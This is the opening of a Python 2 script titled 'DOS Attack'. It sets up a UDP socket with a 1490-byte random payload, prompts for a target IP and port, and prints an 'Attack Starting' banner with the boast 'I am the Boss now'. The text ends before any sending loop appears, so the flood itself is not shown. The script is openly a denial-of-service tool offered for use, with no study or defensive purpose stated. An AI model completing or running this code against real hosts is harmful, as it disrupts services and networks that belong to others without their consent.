import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet DOS Attack ")

print " "
print "Author   : Ngulefac Theophilus"
print "github   : https://github.com/Ngulefac"

print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet 'Attack Starting'")
os.system("echo '       ]===> I am the Boss now <===['")